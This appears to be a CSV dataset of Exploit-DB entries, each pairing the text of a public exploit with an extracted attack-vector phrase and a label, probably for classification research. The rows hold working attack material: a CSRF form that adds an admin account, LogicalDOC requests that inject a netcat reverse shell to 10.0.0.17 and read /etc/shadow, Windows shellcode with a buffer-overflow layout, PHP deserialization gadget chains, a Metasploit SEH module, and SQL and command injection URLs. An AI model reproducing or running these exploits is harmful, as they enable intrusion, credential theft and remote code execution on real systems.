34068,"CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery source: https://www.securityfocus.com/bid/40483/info  CMS Made Simple is prone to multiple cross-site scripting vulnerabilities because the software fails to sufficiently sanitize user-supplied inputs. The application is also prone to a cross-site request-forgery vulnerability.  An attacker may leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  The attacker can exploit the cross-site request-forgery issue by tricking a victim into following a specially crafted HTTP request designed to perform some action on the attacker's behalf using a victim's currently active session.  CMS Made Simple 1.7.1 and prior are vulnerable.   <form name=""csrf""  action=""http://www.example.com:7080/config/confMgr.php"" method=""post"" target=""hidden""> <input type=""hidden"" name=""a"" value=""s"" /> <input type=""hidden"" name=""m"" value=""admin"" /> <input type=""hidden"" name=""p"" value=""security"" /> <input type=""hidden"" name=""t"" value=""`ADMIN_USR_NEW"" /> <input type=""hidden"" name=""r"" value="""" /> <input type=""hidden"" name=""file_create"" value="""" /> <input type=""hidden"" name=""name"" value=""owned"" /> <input type=""hidden"" name=""pass"" value=""password"" /> <input type=""hidden"" name=""pass1"" value=""password"" /> </form>",tricking a victim into following a specially crafted HTTP request designed to perform some action on the attacker's behalf using a victim's currently active session,1
44021,"LogicalDOC Enterprise 7.7.4 - Root Remote Code Execution LogicalDOC Enterprise 7.7.4 Post-Auth Command Execution Via Binary Path Manipulation   Vendor: LogicalDOC Srl Product web page: https://www.logicaldoc.com Affected version: 7.7.4                   7.7.3                   7.7.2                   7.7.1                   7.6.4                   7.6.2                   7.5.1                   7.4.2                   7.1.1  Summary: LogicalDOC is a free document management system that is designed to handle and share documents within an organization. LogicalDOC is a content repository, with Lucene indexing, Activiti workflow, and a set of automatic import procedures.  Desc: LogicalDOC suffers from multiple authenticated OS command execution vulnerabilities by manipulating the path of the many binaries included in the package when changing the settings with their respected arguments. This can be exploited to execute local root privilege escalation attack and/or inject and execute arbitrary system commands as the root or SYSTEM user depending on the platform affected.  Tested on: Microsoft Windows 10            Linux Ubuntu 16.04            Java 1.8.0_161            Apache-Coyote/1.1            Apache Tomcat/8.5.24            Apache Tomcat/8.5.13            Undisclosed 8.41   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2018-5452 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5452.php   26.01.2018     After saving the settings, the command will be executed whenever a user uploads a file that was inserted in the 'default.antivirus.includes' list. PoC for antivirus.command: --------------------------------------------------------------------------------------  POST /frontend/setting HTTP/1.1 Host: localhost:8080 Connection: keep-alive Content-Length: 594 X-GWT-Module-Base: http://localhost:8080/frontend/ X-GWT-Permutation: 87C7268A2BDB185A47D161B6D6D2DEE8 Origin: http://localhost:8080 User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.67 Content-Type: text/x-gwt-rpc; charset=UTF-8 Accept: */* Referer: http://localhost:8080/frontend.jsp?docId=3735554 Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Cookie: GLog=%7B%0A%20%20%20%20trackRPC%3Afalse%0A%7D; JSESSIONID=FCFD7719139A634C8411FD081780BE2A; ldoc-sid=5dd1ea28-36a0-4967-bdd8-2556d16101d7   7|0|16|http://localhost:8080/frontend/|2B4A04609097A6274DA6D61C469E4E6B|com.logicaldoc.gui.frontend.client.services.SettingService|saveSettings|[Lcom.logicaldoc.gui.common.client.beans.GUIParameter;/1603922774|com.logicaldoc.gui.common.client.beans.GUIParameter/3041767606|default.antivirus.enabled|true|default.antivirus.excludes|*.tif,*.tiff,*.jpg,*.jpeg,*.png,*.bmp,*.gif,*.txt,*.iso|default.antivirus.includes|*.exe,*.com,*.pif,*.scr,*.dll,*.tar.gz|default.antivirus.timeout|0|antivirus.command|c:\\windows\\system32\\calc.exe|1|2|3|4|1|5|5|5|6|0|7|8|6|0|9|10|6|0|11|12|6|0|13|14|6|0|15|16|    PoC for call home reverse shell via ocr.Tesseract.path: -------------------------------------------------------  POST /frontend/setting HTTP/1.1 Host: localhost:8080   7|0|25|https://localhost:8080/frontend/|2B4A04609097A6274DA6D61C469E4E6B|com.logicaldoc.gui.frontend.client.services.SettingService|saveSettings|[Lcom.logicaldoc.gui.common.client.beans.GUIParameter;/1603922774|com.logicaldoc.gui.common.client.beans.GUIParameter/3041767606|default.ocr.includes|*.pdf,*.tif,*.png,*.jpg,*.txt|default.ocr.excludes|*.odt|default.ocr.text.threshold|1|default.ocr.resolution.threshold|400|ocr.timeout|90|ocr.rendres|180|ocr.rendres.barcode|ocr.batch|2|ocr.engine|Tesseract|ocr.Tesseract.path|nc -c /bin/sh 10.0.0.17 4444|1|2|3|4|1|5|5|10|6|0|7|8|6|0|9|10|6|0|11|12|6|0|13|14|6|0|15|16|6|0|17|18|6|0|19|18|6|0|20|21|6|0|22|23|6|0|24|25|    PoC for Key Store via OpenSSL path: -----------------------------------  POST /frontend/sign HTTP/1.1 Host: localhost:8080   7|0|14|https://localhost:8080/frontend/|16A5065211C47142C5282B2BC4600F1D|com.logicaldoc.gui.frontend.client.services.SignService|generateNewKeystore|com.logicaldoc.gui.common.client.beans.GUIKeystore/3815185030|java.util.Date/3385151746|1337|/usr/bin/openssl && /usr/bin/cat /etc/shadow|root|O=ZSL,OU=JXY,C=MK|123|#000000|$PAGE_WIDTH/6|5|1|2|3|4|1|5|5|6|WFn2zQZ|A|7|8|9|10|0|11|12|60|100|0|13|14|14|B|2|    PoC for clients and external apps and services path via command.convert, command.gs, command.openssl, command.pdftohtml, command.keytool: -----------------------------------------------------------------------------------------------------------------------------------------  POST /frontend/setting HTTP/1.1 Host: localhost:8080   7|0|35|https://localhost:8080/frontend/|2B4A04609097A6274DA6D61C469E4E6B|com.logicaldoc.gui.frontend.client.services.SettingService|saveSettings|[Lcom.logicaldoc.gui.common.client.beans.GUIParameter;/1603922774|com.logicaldoc.gui.common.client.beans.GUIParameter/3041767606|webservice.enabled|true|webdav.enabled|webdav.usecache|false|command.convert|/usr/bin/whoami > test.txt|command.gs|/usr/bin/gs|command.openssl|/usr/bin/openssl|command.pdftohtml|/usr/bin/pdftohtml|command.keytool|1337|cmis.enabled|cmis.changelog|cmis.maxitems|200|default.extcall.enabled|default.extcall.name|External Call|default.extcall.baseurl||default.extcall.suffix|default.extcall.window|_blank|default.extcall.params|user|1|2|3|4|1|5|5|17|6|0|7|8|6|0|9|8|6|0|10|11|6|0|12|13|6|0|14|15|6|0|16|17|6|0|18|19|6|0|20|21|6|0|22|8|6|0|23|8|6|0|24|25|6|0|26|11|6|0|27|28|6|0|29|30|6|0|31|30|6|0|32|33|6|0|34|35|",manipulating the path of the many binaries included in the package when changing the settings with their respected arguments,1
39284,"Oracle - 'HtmlConverter.exe' Local Buffer Overflow [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/ORACLE-HTMLCONVERTER-BUFFER-OVERFLOW.txt   Vendor: =============== www.oracle.com   Product: ======================================== Java Platform SE 6 U24 HtmlConverter.exe Product Version: 6.0.240.50   The HTML Converter is part of Java SE binary part of the JDK and Allows web page authors to explicitly target the browsers and platforms used in their environment when modifying their pages.    Vulnerability Type: ============================ Buffer Overflow   CVE Reference: ============== N/A    Vulnerability Details: =====================  When calling htmlConverter.exe with specially crafted payload it will cause buffer overflow executing arbitrary attacker supplied code. This was a small vulnerability included as part of the overall Oracle CPU released on January 19, 2016.  Reference: http://www.oracle.com/technetwork/topics/security/cpujan2016-2367955.html    registers ...  EAX FFFFFFFE ECX FFFFFFFE EDX 0008E3C8 EBX 7EFDE000 ESP 0018FEB4 EBP 0018FF88 ESI 00001DB1 EDI 00000000 EIP 52525252                          <-------- ""RRRR"" \x52 C 0  ES 002B 32bit 0(FFFFFFFF) P 0  CS 0023 32bit 0(FFFFFFFF) A 1  SS 002B 32bit 0(FFFFFFFF) Z 0  DS 002B 32bit 0(FFFFFFFF) S 0  FS 0053 32bit 7EFDD000(FFF) T 0  GS 002B 32bit 0(FFFFFFFF) D 0    Exploit code(s): ===============  ###pgm=""C:\\Oracle\\Middleware\\jdk160_24\\bin\\HtmlConverter.exe ""  #EIP @ 2493 pgm=""C:\\Program Files (x86)\\Java\jdk160_24\\bin\\HtmlConverter.exe "" #EIP 2469 - 2479  #shellcode to pop calc.exe Windows 7 SP1 sc=(""\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"" ""\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"" ""\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"" ""\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"" ""\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"" ""\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"" ""\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC"")   #JMP ESP kernel32.dll rp=struct.pack('<L', 0x76E72E2B)   payload=""A""*2469+rp+""\x90""*10+sc subprocess.Popen([pgm, payload], shell=False)   Disclosure Timeline: ===================================== Vendor Notification: August 28, 2015 January 20, 2016  : Public Disclosure    Exploitation Technique: ======================= Local    Severity Level: =============== Medium    Description: =============================================================  Vulnerable Product:     [+] Java SE 6 U24 HtmlConverter.exe  =============================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx",specially crafted payload,1
43886,"Pimcore CMS 1.4.9 <2.1.0 - Multiple Vulnerabilities > Vulnerabilities in Pimcore 1.4.9 to 2.1.0 (inclusive) > Discovered by Pedro Ribeiro (pedrib@gmail.com) of Agile Information Security ==================================================================== Disclosure: 14/04/2014 / Last updated: 12/10/2014  Vulnerability: Remote code execution in Pimcore CMS via unserialize() PHP object injection (CVE-2014-2921) Vulnerability: Arbitrary file deletion in Pimcore CMS via unserialize() PHP object injection (CVE-2014-2922) File(line): pimcore/lib/Pimcore/Tool/Newsletter.php(221)  Summary: This vulnerability can be exploited by sending a base64 encoded payload as the ""token"" parameter to the newsletter unsubscribe page of the target site. Payload [1] abuses several Zend classes to achieve remote code execution (based on Stefan Esser's technique in [2] and Egidio Romano's exploit code from [3]). Payload [4] abuses Zend_Http_Response_Stream to delete a file in /tmp/deleteme and works in all PHP versions.  Versions affected: 1.4.9 to 1.4.10 (inclusive) / 2.0.0 (possibly): Remote code execution (when server is running PHP <= 5.3.3).  1.4.9 to 2.1.0 (inclusive): Arbitrary file deletion (any PHP version), POSSIBLY remote code execution. Version 2.2.0 or higher resolves this vulnerability.  Due to changes introduced in PHP 5.3.4 to reject file names with null bytes, payload [3] does not work on Pimcore versions between 2.0.1 and 2.1.0 as Pimcore enforces a PHP 5.4 requirement. Version 2.0.0 might be vulnerable if anyone is running it on PHP versions <= 5.3.3... which according to the developers is not possible, but the requirement was only enforced in 2.0.1. Note that however the underlying vulnerability for both the remote code execution and the arbitrary file deletion is the same (unserialize() object injection), so it might be possible to execute code if any other Zend PHP POP chains are found in the future.   Fix for vulnerability: https://github.com/pimcore/pimcore/commit/3cb2683e669b5644f180d362cfa9614c09bef280   Newsletter.php added to repository on February 25th 2013 (was released in 1.4.9 on 02/Mar/13): https://github.com/pimcore/pimcore/commit/db18317af47de1de9f9ec6d83db1c2d353d06db7   PHP 5.4 requirement introduced on October 31st 2013 (was released in 2.0.1 on 20/Dec/13): https://github.com/pimcore/pimcore/commit/ee56ac2c1f7c9dc6e1617023fc766ea9c67e601b   Code snippets:  pimcore/lib/Pimcore/Tool/Newsletter.php(221):      public function getObjectByToken($token) {         $data = unserialize(base64_decode($token));         if($data) {             if($object = Object_Abstract::getById($data[""id""])) {                  if($version = $object->getLatestVersion()) {                     $object = $version->getData();                 }   This function is called in the same file in confirm() and unsubscribeByToken():     public function confirm($token) {          $object = $this->getObjectByToken($token);         if($object) {       public function unsubscribeByToken ($token) {          $object = $this->getObjectByToken($token);         if($object) {   In the Pimcore Wiki[5] and sample site[6], users are shown how to use the token parameter and encourage you to take the sample code and modify it. The sample code passes the token directly without any validation in confirmAction():     public function confirmAction() {          $this->enableLayout();          $this->view->success = false;          $newsletter = new Pimcore_Tool_Newsletter(""person""); // replace ""crm"" with the class name you have used for your class above (mailing list)          if($newsletter->confirm($this->getParam(""token""))) {             $this->view->success = true;         }   And also in unsubscribeAction():     public function unsubscribeAction() {          $this->enableLayout();          $newsletter = new Pimcore_Tool_Newsletter(""person""); // replace ""crm"" with the class name you have used for your class above (mailing list)          $unsubscribeMethod = null;         $success = false;          if($this->getParam(""email"")) {             $unsubscribeMethod = ""email"";             $success = $newsletter->unsubscribeByEmail($this->getParam(""email""));         }          if($this->getParam(""token"")) {             $unsubscribeMethod = ""token"";             $success = $newsletter->unsubscribeByToken($this->getParam(""token""));         }   Mitigation: Do not pass untrusted input into the unserialize function. Use JSON encoding / decoding instead of unserialize. This was introduced in commit 3cb2683e669 and released in version 2.2.0.  References: ======================================================== [1] Remote code execution, PHP <= 5.3.3, original code from [3] (Egidio Romano) <?php  class Zend_Search_Lucene_Index_FieldInfo {     public $name = '<?php phpinfo(); die;?>'; }   class Zend_Search_Lucene_Storage_Directory_Filesystem {     protected $_dirPath = null;           public function __construct($path)     {         $this->_dirPath = $path;     } }   interface Zend_Pdf_ElementFactory_Interface {}   class Zend_Search_Lucene_Index_SegmentWriter_StreamWriter implements Zend_Pdf_ElementFactory_Interface {     protected $_docCount = 1;     protected $_name = 'foo';     protected $_directory;     protected $_fields;     protected $_files;           public function __construct($directory, $fields)     {         $this->_directory = $directory;         $this->_fields    = array($fields);         $this->_files     = new stdClass;     } }       class Zend_Pdf_ElementFactory_Proxy {     private $_factory;           public function __construct(Zend_Pdf_ElementFactory_Interface $factory)     {         $this->_factory = $factory;     } }   // This null byte technique only works in PHP <= 5.3.3 $directory = new Zend_Search_Lucene_Storage_Directory_Filesystem(""/var/www/malicious.php\0""); $__factory = new Zend_Search_Lucene_Index_SegmentWriter_StreamWriter($directory, new Zend_Search_Lucene_Index_FieldInfo); $____proxy = new Zend_Pdf_ElementFactory_Proxy($__factory);   echo base64_encode(serialize($____proxy));  ?>  ======================================================== [2] http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf [3] http://www.exploit-db.com/exploits/19573 ======================================================== [4] Arbitrary file deletion, all PHP versions <?php class Zend_Http_Response_Stream  {     protected $stream;     protected $stream_name;     protected $_cleanup;     public function setStream($stream)     {         $this->stream = $stream;         return $this;     }     public function setCleanup($cleanup = true) {         $this->_cleanup = $cleanup;     }     public function setStreamName($stream_name) {         $this->stream_name = $stream_name;         return $this;     } } $resp = new Zend_Http_Response_Stream(); $resp->setStream(null); $resp->setCleanup(); $resp->setStreamName(""/tmp/deleteme"");  echo base64_encode(serialize($resp)); ?>  ======================================================== [5] http://www.pimcore.org/wiki/display/PIMCORE/Newsletter [6] Downloadable from the Pimcore website (https://www.pimcore.org/download/pimcore-data.zip). The file mentioned is website/controllers/NewsletterController.php.  Other references: https://www.owasp.org/index.php/PHP_Object_Injection http://www.alertlogic.com/writing-exploits-for-exotic-bug-classes/ http://vagosec.org/2013/12/wordpress-rce-exploit/   ================ Agile Information Security Limited http://www.agileinfosec.co.uk/ >> Enabling secure digital business >>","sending a base64 encoded payload as the ""token"" parameter to the newsletter unsubscribe page of the target site",1
36437,"Publish-It - '.PUI' Local Buffer Overflow (SEH) (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::FILEFORMAT    def initialize(info = {})     super(update_info(info,       'Name'    => 'Publish-It PUI Buffer Overflow (SEH)',       'Description'  => %q{           This module exploits a stack based buffer overflow in Publish-It when           processing a specially crafted .PUI file. This vulnerability could be           exploited by a remote attacker to execute arbitrary code on the target           machine by enticing a user of Publish-It to open a malicious .PUI file.       },       'License'    => MSF_LICENSE,       'Author'    =>         [           'Daniel Kazimirow',  # Original discovery           'Andrew Smith ""jakx_""',  # Exploit and MSF Module         ],       'References'  =>         [           [ 'OSVDB', '102911' ],           [ 'CVE', '2014-0980' ],           [ 'EDB', '31461' ]         ],       'DefaultOptions' =>         {           'ExitFunction' => 'process',         },       'Platform'  => 'win',       'Payload'  =>         {           'BadChars' => ""\x00\x0b\x0a"",           'DisableNops' => true,           'Space' => 377         },       'Targets'    =>         [           [ 'Publish-It 3.6d',             {               'Ret'     =>  0x0046e95a, #p/p/r | Publish.EXE               'Offset'  =>  1082             }           ],         ],       'Privileged'  => false,       'DisclosureDate'  => 'Feb 5 2014',       'DefaultTarget'  => 0))      register_options([OptString.new('FILENAME', [ true, 'The file name.', 'msf.pui']),], self.class)    end    def exploit      path = ::File.join(Msf::Config.data_directory, ""exploits"", ""CVE-2014-0980.pui"")     fd = File.open(path, ""rb"")     template_data = fd.read(fd.stat.size)     fd.close      buffer = template_data     buffer << make_nops(700)     buffer << payload.encoded     buffer << make_nops(target['Offset']-payload.encoded.length-700-5)     buffer << Rex::Arch::X86.jmp('$-399') #long negative jump -399     buffer << Rex::Arch::X86.jmp_short('$-24') #nseh negative jump     buffer << make_nops(2)     buffer << [target.ret].pack(""V"")      print_status(""Creating '#{datastore['FILENAME']}' file ..."")     file_create(buffer)    end end",a specially crafted .PUI file,1
39694,"Microsoft Excel - Out-of-Bounds Read Code Execution (MS16-042) #######################################################################################  # Title: Microsoft Office Excel Out-of-Bounds Read Remote Code Execution # Application: Microsoft Office Excel # Affected Products: Microsoft Office Excel 2007,2010,2013,2016 # Software Link: https://products.office.com/en-ca/excel # Date: April 12, 2016 # CVE: CVE-2016-0122 (MS16-042) # Author: Sébastien Morin from COSIG # Contact: https://twitter.com/COSIG_ (@COSIG_) # Personal contact: https://smsecurity.net/; https://twitter.com/SebMorin1 (@SebMorin1)  #######################################################################################  =================== Introduction: ===================  Microsoft Excel is a spreadsheet developed by Microsoft for Windows, Mac OS X, and iOS. It features calculation, graphing tools, pivot tables, and a macro programming language called Visual Basic for Applications. It has been a very widely applied spreadsheet for these platforms, especially since version 5 in 1993, and it has replaced Lotus 1-2-3 as the industry standard for spreadsheets. Excel forms part of Microsoft Office.  (https://en.wikipedia.org/wiki/Microsoft_Excel)  #######################################################################################  =================== Report Timeline: ===================  2016-02-06: Sébastien Morin from COSIG report the vulnerability to MSRC. 2016-02-16: MSRC confirm the vulnerability. 2016-04-12: Microsoft fixed the issue (MS16-042). 2016-04-13: Advisory released. #######################################################################################  =================== Technical details: ===================  This vulnerability could allow remote code execution if a user opens a specially crafted Microsoft Office file (.xlsm). An attacker who successfully exploited the vulnerabilities could run arbitrary code in the context of the current user.  #######################################################################################  ========== POC: ==========  https://smsecurity.net/wp-content/uploads/2016/04/Microsoft_Office_Excel_Out-of-Bounds_Read_RCE.xlsm https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39694.zip  #######################################################################################",a specially crafted Microsoft Office file (.xlsm),1
7854,"MediaMonkey 3.0.6 - '.m3u' Local Buffer Overflow (PoC) #!/usr/bin/perl # By ALpHaNiX # NullArea.Net # THanks #can get the software from http://www.download.com/MediaMonkey-Standard/3000-2141_4-10109807.html  my $file = ""alpix.m3u"" ; print ""[+] Exploiting....."" ; my $buff1=""http://"".""A"" x 543339 ; open(m3u, "">>$file"") or die ""Cannot open $file""; print m3u $buff1; close(m3u); print ""\n[+] done !"";  # milw0rm.com [2009-01-25]",a specially crafted .m3u file,1
22107,"SPGPartenaires 3.0.1 - 'ident.php' SQL Injection source: https://www.securityfocus.com/bid/6455/info  Several vulnerabilities have been discovered in SPGPartenaires. The vulnerabilities are due to insufficient sanitization of the 'pass' and 'SPGP' variables used to construct SQL queries in various PHP scripts. By exploiting these issues it is possible to modify the logic of SQL queries through malformed query strings in requests for the vulnerable script.  By injecting SQL code into the 'pass' or 'SPGP' variable, it may be possible for an attacker to corrupt member information. It may also be possible for attackers to perform more advanced attacks on the underlying database.   http://www.example.com/modif/ident.php?id=[MEMBERID]&pass='%20OR%20''='",malformed query strings in requests for the vulnerable script,1
20639,"Bajie 0.78 - Arbitrary Shell Command Execution source: https://www.securityfocus.com/bid/2389/info  Requesting a specailly crafted URL containg arbitrary code, can be exected on a Unix system running Bajie Webserver. Any arbitrary commands appended to a malicious URL after the ';' will be executed as an independent job.   http://target/bin/test.txt;%20[shell command]",malicious scripts,1
31478,Linksys SPA-2102 Phone Adapter Packet Handling - Denial of Service source: https://www.securityfocus.com/bid/28414/info  Linksys SPA-2102 Phone Adapter is prone to a denial-of-service vulnerability when handling multiple packets in quick succession.  Attackers can exploit this issue to deny access to the device's control center for legitimate users. Reports indicate that this issue is exploitable only via computers on the same LAN as the device.  Linksys SPA-2102 Phone Adapter running firmware 3.3.6 is vulnerable; other versions may also be affected.  ping -l 65500 192.168.0.1,handling multiple packets in quick succession,1
